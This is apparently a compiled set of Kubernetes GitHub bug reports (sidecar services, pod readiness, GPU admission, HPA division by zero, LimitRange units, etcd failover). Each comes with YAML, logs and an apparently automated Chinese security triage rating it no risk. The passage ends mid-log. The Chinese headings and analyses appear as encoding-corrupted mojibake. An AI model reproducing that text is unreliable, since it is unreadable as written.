## Issue #128825 Sidecar Containers for Services are not accessible

- Issue é“¾æ¥ï¼š[#128825](https://github.com/kubernetes/kubernetes/issues/128825)

### Issue å†…å®¹

#### What happened?

I'm using a helm chart to deploy an application, and I typically insert an specific proxy I need as a legacy sidecar (after init). However, this helm chart specifically does now allow specifying additional containers (again, legacy sidecar pattern), but it does allow specifying init containers using the newer [Sidecar Containers](https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/) feature.

The sidecar config might look like this with the new sidecar pattern:
```yaml
      initContainers:
        - name: myproxy
          image: myproxy
          restartPolicy: Always
          ports:
            - containerPort: 8080
              name: proxy-port
              protocol: TCP
```

After deploying this:
- The `v1/Service` has endpoints that point to the target pods
- Manually, I can connect to `<pod IP>:8080`
- Attempting to connect to the service results in a connection refused.

#### What did you expect to happen?

The connection to the sidecar should work.

#### How can we reproduce it (as minimally and precisely as possible)?

- Create a pod with a named port in a container under `initContainers` with `restartPolicy: Always`
- Create a `v1/Service` that has a `selector` that targets the pod
- Attempt to lookup the SRV record

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.30.5-gke.1443001
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueè®¨è®ºäº†åœ¨Kubernetesä¸­ä½¿ç”¨`initContainers`ä½œä¸ºSidecarå®¹å™¨çš„é—®é¢˜ã€‚æ ¹æ®Kubernetesçš„è®¾è®¡ï¼Œ`initContainers`æ˜¯åœ¨ä¸»å®¹å™¨ä¹‹å‰è¿è¡Œçš„åˆå§‹åŒ–å®¹å™¨ï¼Œè¿è¡Œå®Œæˆåå³é€€å‡ºï¼Œä¸ä¼šæŒç»­è¿è¡Œã€‚å› æ­¤ï¼Œå°†`initContainers`é…ç½®ä¸ºSidecarå®¹å™¨å¹¶æœŸæœ›å…¶æä¾›æŒç»­çš„æœåŠ¡æ˜¯ä¸€ä¸ªé”™è¯¯çš„ä½¿ç”¨æ–¹å¼ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸ªIssueåæ˜ çš„æ˜¯ä¸€ä¸ªé…ç½®è¯¯ç”¨é—®é¢˜ï¼Œå¹¶ä¸å­˜åœ¨æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚æ²¡æœ‰æåŠä»»ä½•å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„æ¼æ´ï¼Œä¹Ÿæ²¡æœ‰æ¶‰åŠæ•æ„Ÿä¿¡æ¯çš„æ³„éœ²æˆ–é«˜é£é™©çš„å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæœ¬Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128820 In terminating pod, status of containers is not updated

- Issue é“¾æ¥ï¼š[#128820](https://github.com/kubernetes/kubernetes/issues/128820)

### Issue å†…å®¹

#### What happened?

When a pod with several containers is terminating, until all of those containers successfully terminate, the number of ready containers is not updated. For example, if you have a pod with two containers and one of them immediately exits and one of them has a prestop hook that sleeps for several minutes, the pod will show up as 2/2 containers ready even though one container immediately exits.

See kubelet logs here: https://gist.github.com/olyazavr/7f77673a47ce441b3a8670d509de8b16

#### What did you expect to happen?

I expect that the pod status should reflect the number of containers that is actually ready, even if the pod is terminating.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a pod with two containers, one of which has a prestop hook that sleeps:
```
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
spec:
  terminationGracePeriodSeconds: 200
  containers:
  - name: test
    command: ["bash", "-c", "sleep infinity"]
  - name: test2
    command: ["bash", "-c", "sleep infinity"]
    lifecycle:
      preStop:
        exec:
          command: ["bash", "-c", "sleep 180"]

```

Delete the pod, and notice that it will stay at 2/2 ready until both containers die even when the runtime acknowledges that one container has been successfully shut down early on

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.10
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.10
```

</details>


#### Cloud provider

<details>
aws
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="AlmaLinux"
VERSION="9.3 (Shamrock Pampas Cat)"
ID="almalinux"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.3"
PLATFORM_ID="platform:el9"
PRETTY_NAME="AlmaLinux 9.3 (Shamrock Pampas Cat)"
ANSI_COLOR="0;34"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:almalinux:almalinux:9::baseos"
HOME_URL="https://almalinux.org/"
DOCUMENTATION_URL="https://wiki.almalinux.org/"
BUG_REPORT_URL="https://bugs.almalinux.org/"

ALMALINUX_MANTISBT_PROJECT="AlmaLinux-9"
ALMALINUX_MANTISBT_PROJECT_VERSION="9.3"
REDHAT_SUPPORT_PRODUCT="AlmaLinux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.3"
$ uname -a
Linux ip-172-18-59-83 6.1.109-hs83.el9.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Sep 24 17:33:44 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
crio and containerd
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œå½“ä¸€ä¸ªåŒ…å«å¤šä¸ªå®¹å™¨çš„Podæ­£åœ¨ç»ˆæ­¢æ—¶ï¼Œç›´åˆ°æ‰€æœ‰å®¹å™¨éƒ½æˆåŠŸç»ˆæ­¢ï¼ŒPodçš„å°±ç»ªï¼ˆReadyï¼‰çŠ¶æ€ä¸ä¼šæ›´æ–°ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæœ‰ä¸€ä¸ªPodåŒ…å«ä¸¤ä¸ªå®¹å™¨ï¼Œå…¶ä¸­ä¸€ä¸ªå®¹å™¨ç«‹å³é€€å‡ºï¼Œå¦ä¸€ä¸ªå®¹å™¨æœ‰ä¸€ä¸ªéœ€è¦ç­‰å¾…å‡ åˆ†é’Ÿçš„preStop hookï¼ŒPodä»ç„¶ä¼šæ˜¾ç¤ºä¸º2/2ä¸ªå®¹å™¨å°±ç»ªï¼Œå³ä½¿å…¶ä¸­ä¸€ä¸ªå®¹å™¨å·²ç»é€€å‡ºã€‚

è¿™æ˜¯ä¸€ä¸ªå…³äºPodçŠ¶æ€æ˜¾ç¤ºçš„ä¸ä¸€è‡´æ€§é—®é¢˜ï¼Œå¯èƒ½ä¼šå½±å“è¿ç»´äººå‘˜å¯¹Podå®é™…è¿è¡ŒçŠ¶æ€çš„åˆ¤æ–­ã€‚ç„¶è€Œï¼Œæ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ­¤é—®é¢˜ä¸»è¦å½±å“çŠ¶æ€æ˜¾ç¤ºï¼Œä¸æ¶‰åŠæ”»å‡»è€…å¯åˆ©ç”¨çš„æ¼æ´ã€‚
2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šæ­¤é—®é¢˜ä¸å¤ªå¯èƒ½è¢«åˆ†é…CVEç¼–å·ï¼ŒæŒ‰ç…§CVSSè¯„åˆ†ï¼Œä¹Ÿä¸æ»¡è¶³é«˜é£é™©çš„æ¡ä»¶ã€‚
8. **å¦‚æœIssueå¯èƒ½å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å®‰å…¨é£é™©çš„é—®é¢˜ï¼Œåˆ™æ— è®ºæ”»å‡»è€…å®æ–½è¯¥æ”»å‡»æ˜¯å¦éœ€è¦æƒé™éƒ½åº”åˆ¤æ–­ä¸ºé«˜é£é™©**ï¼šæ­¤Issueä¸æ¶‰åŠæ­¤ç±»é«˜é£é™©é—®é¢˜ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128854 pod requesting zero devices with zero available fails admission for 'Allocate failed due to no healthy devices present'

- Issue é“¾æ¥ï¼š[#128854](https://github.com/kubernetes/kubernetes/issues/128854)

### Issue å†…å®¹

#### What happened?

pod create failed

```
status:
  message: 'Pod was rejected: Allocate failed due to no healthy devices present; cannot allocate unhealthy devices      nvidia.com/gpu, which is unexpected'
  phase: Failed
  reason: UnexpectedAdmissionError
  startTime: "2024-11-19T03:04:55z"
```

pod yaml is 

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: jktest
spec:
  selector:
    matchLabels:
      workload.es.io: jktest
  template:
    metadata:
      labels:
        workload: jktest
    spec:
      containers:
      - image: centos:latest
        imagePullPolicy: IfNotPresent
        name: test
        resources:
          limits:
            cpu: 250m
            memory: 512Mi
            nvidia.com/gpu: "0"
          requests:
            cpu: 250m
            memory: 512Mi
            nvidia.com/gpu: "0"
```

the node info is

```
...
allocatable: 
  memory: 252717800Ki       
  nvidia.com/gpu: "0"
  pods: "255"
capacity: 
  memory: 263278312Ki 
  nvidia.com/gpu: "0" 
  pods: "255"
```

This failure are very similar to https://github.com/kubernetes/kubernetes/issues/109191 , but the prompts are different.

#### What did you expect to happen?

When the number of `external resource` requests in a pod is `0`, the creation is successful.

#### How can we reproduce it (as minimally and precisely as possible)?

1 create pod a which use hot pluggable device in resource.request, and the resource is 1
2 remove device
3 create pod b which use hot pluggable device in resource.request, and the ressource is 0

#### Anything else we need to know?

I am confident that this issue was introduced by the [pull](https://github.com/kubernetes/kubernetes/pull/114640).

Unable to control the application even when resources are not used, but set to 0, for more information see [issue](https://github.com/kubernetes/kubernetes/issues/109191).

#### Kubernetes version


```console
$ kubectl version
Client Version: v1.28.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.2
```


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®æä¾›çš„Issueå†…å®¹ï¼Œé—®é¢˜æè¿°åœ¨åˆ›å»ºè¯·æ±‚é›¶ä¸ªGPUè®¾å¤‡çš„podæ—¶ï¼Œå‡ºç°äº†`Allocate failed due to no healthy devices present; cannot allocate unhealthy devices nvidia.com/gpu, which is unexpected`çš„é”™è¯¯ã€‚

è¿™ä¸ªé—®é¢˜ä¸Kubernetesè°ƒåº¦å™¨å¤„ç†èµ„æºè¯·æ±‚çš„æ–¹å¼æœ‰å…³ï¼Œå½“è¯·æ±‚çš„è®¾å¤‡æ•°é‡ä¸º0ä¸”å¯ç”¨è®¾å¤‡ä¸º0æ—¶ï¼Œpodåˆ›å»ºå¤±è´¥ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šä»æè¿°ä¸­çœ‹ï¼Œæ²¡æœ‰æåŠæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥é—®é¢˜ã€‚
2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šæ­¤é—®é¢˜ä¼¼ä¹æ˜¯åŠŸèƒ½æ€§ç¼ºé™·ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚
3. **Issueæäº¤è€…åœ¨æäº¤å†…å®¹ä¸­æš´éœ²çš„æ•æ„Ÿä¿¡æ¯ã€ä¸å½“æ“ä½œã€ä¸å½“é…ç½®ç­‰é—®é¢˜ï¼Œä¸å±äºå®‰å…¨é£é™©**ï¼šæ­¤é—®é¢˜ä¸ºé…ç½®å’Œè°ƒåº¦é€»è¾‘çš„é—®é¢˜ã€‚
4. **åœ¨é£é™©ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†**ï¼šåˆ›å»ºpodéœ€è¦ç›¸åº”æƒé™ï¼Œä¸”è¯¥é—®é¢˜ä¸æ¶‰åŠæ‹’ç»æœåŠ¡ã€‚

ç»¼åˆæ¥çœ‹ï¼Œè¯¥Issueæè¿°çš„é—®é¢˜å±äºåŠŸèƒ½æ€§é—®é¢˜ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128847 Division-by-zero in Horizontal Workload Autoscaler

- Issue é“¾æ¥ï¼š[#128847](https://github.com/kubernetes/kubernetes/issues/128847)

### Issue å†…å®¹

**Which component are you using?**:

Horizontal workload autoscaler.

**What version of the component are you using?**:

Not relevant.

**What k8s version are you using (`kubectl version`)?**:

<details><summary><code>kubectl version</code> Output</summary><br><pre>
$ kubectl version
Client Version: v1.30.6-dispatcher
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5-gke.1443001
</pre></details>

**What environment is this in?**:

Not relevant.

**What did you expect to happen?**:

When the horizontal autoscaler computes the expected number of replicas, [it uses the following formula](https://github.com/kubernetes/kubernetes/blob/cf480a3a1a9cb22f3439c0a7922822d9f67f31b5/pkg/controller/podautoscaler/replica_calculator.go#L369):

```go
usageRatio := float64(usage) / (float64(targetUsagePerPod) * float64(statusReplicas))
```

(This formula (or a variation of it) appears a couple of times in [this file](https://github.com/kubernetes/kubernetes/blob/cf480a3a1a9cb22f3439c0a7922822d9f67f31b5/pkg/controller/podautoscaler/replica_calculator.go#L369).)

It's not impossible that `statusReplicas` (i.e. the `status.replicas` field of the `/scale` subresource) equals zero (e.g. if a user kills pods), leading to a division by zero.

[The Golang spec allows divisions by zero to trigger traps](https://github.com/golang/go/issues/43577), although most implementations would return +Inf (which leads to the correct behaviour) or NaN (if `usage == 0.`, in which case the func would return a negative number of replicas).

**What happened instead?**:

This problem could lead to a panic, or an incorrect behaviour. This could only happen as a result of a race condition, and in the unlikely situation where `status.replicas == 0`. I'm not sure of its practical significance.

**How to reproduce it (as minimally and precisely as possible)**:

This issue only appears as a result of a race condition. I couldn't produce it.


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
åœ¨æ­¤Issueä¸­ï¼Œæå‡ºäº†åœ¨Kubernetesçš„Horizontal Workload Autoscalerä¸­ï¼Œå¯èƒ½å­˜åœ¨é™¤é›¶é”™è¯¯çš„é—®é¢˜ã€‚å½“`statusReplicas`ä¸º0æ—¶ï¼Œè®¡ç®—`usageRatio`æ—¶ä¼šå‘ç”Ÿé™¤é›¶ã€‚

æ ¹æ®æè¿°ï¼Œè¿™ç§æƒ…å†µéœ€è¦åœ¨ç‰¹æ®Šçš„ç«äº‰æ¡ä»¶ä¸‹æ‰èƒ½å‡ºç°ï¼Œä¸”å‘ç”Ÿçš„å¯èƒ½æ€§æä½ã€‚æäº¤è€…ä¹Ÿæ— æ³•é‡ç°è¯¥é—®é¢˜ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼Œé™¤éæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶æˆ–å½±å“`statusReplicas`çš„å€¼ä½¿å…¶ä¸º0ï¼Œå¦åˆ™æ— æ³•åˆ©ç”¨è¯¥é—®é¢˜è¿›è¡Œæ”»å‡»ã€‚è€Œé€šå¸¸æƒ…å†µä¸‹ï¼Œéç‰¹æƒç”¨æˆ·æ— æ³•ç›´æ¥å½±å“åˆ°`statusReplicas`çš„å€¼ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜ä¸æ»¡è¶³è¢«æ”»å‡»è€…åˆ©ç”¨ä¸”é€ æˆé«˜é£é™©çš„æ¡ä»¶ã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128813 LimitRange and ResourceQuota Accept Values Without Units, Leading to Pod Scheduling and Runtime Failures

- Issue é“¾æ¥ï¼š[#128813](https://github.com/kubernetes/kubernetes/issues/128813)

### Issue å†…å®¹

#### What happened?

When creating a LimitRange or ResourceQuota without specifying units for memory and storage (e.g., "2" instead of "2Gi"), Kubernetes accepts the resource creation. However, pods fail to be scheduled, resulting in the following error:
`Error creating: pods "...": [maximum memory usage per Pod is 2, but limit is 1Gi, maximum memory usage per Container is 2, but limit is 1Gi]`

Upon adjusting pod resource requests and limits to omit units (e.g., memory: 1), pods schedule but remain stuck in the ContainerCreating phase with containerd errors:
`Failed to create pod sandbox: rpc error: code = Unknown desc = failed to create containerd task: failed to create shim task: OCI runtime create failed...`




#### What did you expect to happen?

1. Kubernetes should reject LimitRange or ResourceQuota configurations without specified units for memory and storage.
2. Alternatively, Kubernetes should normalize the values to a default unit to ensure compatibility.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a LimitRange without units for memory:
yaml
`apiVersion: v1
kind: LimitRange
metadata:
  name: example-limitrange
  namespace: test-namespace
spec:
  limits:
  - type: Pod
    max:
      memory: "2"
    min:
      memory: "500m"
  - type: Container
    max:
      memory: "2"
    min:
      memory: "250m"
`

2. Create a ResourceQuota without units:
`
apiVersion: v1
kind: ResourceQuota
metadata:
  name: example-resourcequota
  namespace: test-namespace
spec:
  hard:
    limits.memory: "4"
    requests.memory: "4"
`
4. Deploy a pod with the following resource configuration:
`resources:
  requests:
    cpu: 500m
    memory: 512Mi
  limits:
    cpu: 500m
    memory: 1024Mi
`
5.Observe pod creation failure with FailedCreate event.
6.Update the pod memory to omit units:

`resources:
  requests:
    cpu: 500m
    memory: 1
  limits:
    cpu: 500m
    memory: 1
`
7. Observe pod stuck in ContainerCreating state with containerd errors.

#### Anything else we need to know?

This issue occurs consistently across multiple clusters. ( EKs , k3s ...)
Errors in the ContainerCreating phase point to systemd and containerd issues when using unnormalized values

#### Kubernetes version

<details>

```console
$ kubectl version
# Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.6-eks-7f9249a
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨åˆ›å»ºKubernetesçš„LimitRangeæˆ–ResourceQuotaæ—¶ï¼Œå¦‚æœæœªä¸ºå†…å­˜å’Œå­˜å‚¨æŒ‡å®šå•ä½ï¼ˆä¾‹å¦‚ä½¿ç”¨"2"è€Œä¸æ˜¯"2Gi"ï¼‰ï¼ŒKubernetesä¼šæ¥å—èµ„æºåˆ›å»ºï¼Œä½†ä¼šå¯¼è‡´Podæ— æ³•è°ƒåº¦ï¼Œæˆ–è€…åœ¨ContainerCreatingé˜¶æ®µé‡åˆ°é”™è¯¯ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ­¤é—®é¢˜éœ€è¦å…·å¤‡åˆ›å»ºæˆ–ä¿®æ”¹LimitRangeå’ŒResourceQuotaçš„æƒé™ï¼Œæ™®é€šç”¨æˆ·é€šå¸¸ä¸å…·å¤‡æ­¤æƒé™ã€‚

4. **å½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©**ï¼šå› ä¸ºéœ€è¦è¾ƒé«˜çš„æƒé™æ‰èƒ½å®æ–½æ­¤æ“ä½œã€‚

å› æ­¤ï¼Œæ­¤Issueä¸»è¦æ¶‰åŠé…ç½®ä¸å½“å¯¼è‡´çš„è¿è¡Œé—®é¢˜ï¼Œä¸å±äºå®‰å…¨é£é™©ã€‚

---

## Issue #128812 The kube-apiserver (with 3 etcd endpints by --etcd-servers)still connect the unhealthy etcd member when we shut down one master node(which has one etcd static pods)

- Issue é“¾æ¥ï¼š[#128812](https://github.com/kubernetes/kubernetes/issues/128812)

### Issue å†…å®¹

#### What happened?

1. we use the kube-apiserver connect to etcd by three members as :
```
"etcd-servers": [
      "https://10.255.69.14:2379",
      "https://10.255.69.15:2379",
      "https://10.255.69.16:2379",
      "https://localhost:2379"
    ],
```

2. Shut down the master3 node(10.255.69.16), which has both etcd and apiserver static pods


3. Found the master1(10.255.69.14) apiserver and master2(10.255.69.15) apiserver still connect to the unhealthy 10.255.69.16 etcd endpoint

#### What did you expect to happen?

When we shutdown one etcd member, the kube-apiserver should quickly switch to the healthy etcd endpoint

#### How can we reproduce it (as minimally and precisely as possible)?

1 set the apiserver connect etcd by --etcd-servers ,which has 3 members
2 shut down the master(not reboot)

#### Anything else we need to know?

- kube-apiserver logs show as follows:
```
apiserver 
2024-11-15T16:08:24.340356305+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:24.340Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc01402e000/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}
2024-11-15T16:08:24.340460558+08:00 stderr F I1115 08:08:24.340378      20 healthz.go:257] etcd check failed: readyz
2024-11-15T16:08:24.340460558+08:00 stderr F [-]etcd failed: error getting data from etcd: context deadline exceeded
2024-11-15T16:08:24.340541843+08:00 stderr F E1115 08:08:24.340479      20 timeout.go:141] post-timeout activity - time-elapsed: 1.001696115s, GET "/readyz" result: <nil>
2024-11-15T16:08:27.369028487+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:27.368Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00f856000/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}
2024-11-15T16:08:27.369028487+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:27.368Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00f856000/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}
2024-11-15T16:08:28.614097370+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:28.613Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00
20b5880/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}
2024-11-15T16:08:28.614097370+08:00 stderr F I1115 08:08:28.613845      20 trace.go:205] Trace[523486837]: "GuaranteedUpdate etcd3" audit-id:dbab0d30-2e4f-4604-b367-c84f000f1f86,key:/configmaps/kube-system/kube-controller-manag
er,type:*core.ConfigMap (15-Nov-2024 08:08:23.614) (total time: 4999ms):
2024-11-15T16:08:28.614097370+08:00 stderr F Trace[523486837]: ---"Txn call finished" err:context deadline exceeded 4998ms (08:08:28.613)
2024-11-15T16:08:28.614097370+08:00 stderr F Trace[523486837]: [4.999504982s] [4.999504982s] END
2024-11-15T16:08:28.616421774+08:00 stderr F I1115 08:08:28.616312      20 trace.go:205] Trace[1123415286]: "Update" url:/api/v1/namespaces/kube-system/configmaps/kube-controller-manager,user-agent:kube-controller-manager/v1.25.8 (linux/amd64) kubernetes/594da2b/leader-election,audit-id:dbab0d30-2e4f-4604-b367-c84f000f1f86,client:127.0.0.1,accept:application/vnd.kubernetes.protobuf, */*,protocol:HTTP/2.0 (15-Nov-2024 08:08:23.614) (total time: 5002ms):
2024-11-15T16:08:28.616421774+08:00 stderr F Trace[1123415286]: ---"Write to database call finished" len:535,err:Timeout: request did not complete within requested timeout - context deadline exceeded 4999ms (08:08:28.613)      
2024-11-15T16:08:28.616421774+08:00 stderr F Trace[1123415286]: [5.002050748s] [5.002050748s] END
2024-11-15T16:08:28.616890678+08:00 stderr F E1115 08:08:28.616631      20 timeout.go:141] post-timeout activity - time-elapsed: 2.794599ms, PUT "/api/v1/namespaces/kube-system/configmaps/kube-controller-manager" result: <nil> 
2024-11-15T16:08:30.058932458+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:30.058Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"}

2024-11-15T16:08:32.011392068+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.011Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00bd06fc0/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:50894->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012062393+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.011Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0a4efcc40/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:44404->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012211954+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.011Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012211954+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.012Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012226796+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.012Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012226796+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.012Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.012226796+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:32.012Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc010bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
